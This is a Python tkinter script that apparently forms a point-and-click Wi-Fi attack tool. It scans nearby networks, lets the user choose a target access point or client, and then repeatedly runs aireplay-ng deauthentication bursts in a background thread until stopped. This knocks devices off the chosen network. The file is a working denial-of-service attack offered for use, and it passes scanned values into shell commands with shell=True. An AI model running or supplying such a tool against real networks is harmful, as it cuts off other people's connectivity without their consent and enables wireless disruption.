#!/usr/bin/env python3
__author__ = 'Jon Stratton'
import tkinter as tk
import subprocess, re, os
import threading
from functools import partial
from netaddr import *

stop_threads = False

# List the connected network interfaces.
def system_interfaces(if_type = None):
    if_list = []
    for iface in os.listdir('/sys/class/net'):
        if (if_type) and (not iface.startswith(if_type)):
            continue
        if (iface == 'lo'):
            continue
        if_list.append(iface)
    return(if_list)

# Scan the interface for networks.
def get_available_networks(interface):
    net_list = []
    network  = {}
    cmd = 'sudo iwlist %s scan' % ( interface )
    p = subprocess.Popen( cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
    for line in p.stdout.readlines():
       split_line = line.decode('utf-8').rstrip().split(':')
       key = split_line[0]
       value = re.sub(r'^"|"$', '', ':'.join( split_line[1:] ).strip())
       if key.endswith('Address'): # New record found
          if network and network.get('ESSID', ''):
             net_list.append(network)
          network = {} # Clear it out
          network['Address'] = value # Start the new one
       else:
          network[key.strip()] = value
    retval = p.wait
    if network and network.get('ESSID', ''):
       net_list.append( network )
    return net_list

# Deauth all clients on network.
def deauth_clients(interface, address, type="ap"):
    while True:
        global stop_threads
        if stop_threads:
            break
        cmd = 'sudo aireplay-ng -0 5 -a %s %s' % ( address, interface )
        if type == "st":
            cmd = 'sudo aireplay-ng -0 5 -c %s %s' % ( address, interface )
        code = subprocess.call( cmd, shell=True, stdout=None, stderr=None )

class Application(tk.Frame):
    def __init__(self, master=None):
        super().__init__(master)
        self.interfaces = system_interfaces("wl")
        self.interface = ""
        if len(self.interfaces) > 0:
            self.interface = self.interfaces[0]
        self.networks = []
        self.target_address = ""
        self.running_attack_thread = ""

        self.master = master
        self.pack()
        self.main_select()

    def main_select(self):
        for widget in self.winfo_children():
            widget.destroy()
        self.master.title("Main")
        self.main = tk.Button(self, text="Scan", command=partial(self.scan_progress))
        self.main.pack(side="top")
        self.main = tk.Button(self, text="Select", command=self.target_select)
        self.main.pack(side="top")
        self.main = tk.Button(self, text="Attack", command=self.attack_progress)
        self.main.pack(side="top")

    def scan_progress(self):
        self.networks = get_available_networks(self.interface)

    def target_select(self, address=None):
        for widget in self.winfo_children():
            widget.destroy()
        self.master.title("Select Target")
        self.main = tk.Button(self, text="[BACK]", command=self.main_select)
        self.main.pack(side="top")

        if address:
            self.target_address = address

        for network in self.networks:
            essid = network.get('ESSID', '')
            if (len(essid) > 30):
                essid = essid[0:30] + '...'
            address = network.get('Address', '')
            state = "normal"
            if (address == self.target_address):
                state = "disabled"
            self.main = tk.Button(self, text=essid, state=state, command=partial(self.target_select, address))
            self.main.pack(side="bottom")

    def attack_progress(self):
        for widget in self.winfo_children():
            widget.destroy()
        self.master.title("Attack Progress")
        self.main = tk.Button(self, text="[BACK]", command=self.main_select)
        self.main.pack(side="top")
        self.main = tk.Button(self, text="Deauth", command=partial(self.attack_thread_start, self.interface, self.target_address))
        self.main.pack(side="top")
        self.main = tk.Button(self, text="Stop", command=self.attack_thread_stop)
        self.main.pack(side="top")

    def attack_thread_start(self, interface, address):
        global stop_threads
        stop_threads = False
        self.running_attack_thread = threading.Thread(target=deauth_clients, args=(interface, address))
        self.running_attack_thread.start()

    def attack_thread_stop(self):
        global stop_threads
        stop_threads = True

root = tk.Tk()
app = Application(master=root)
app.mainloop()
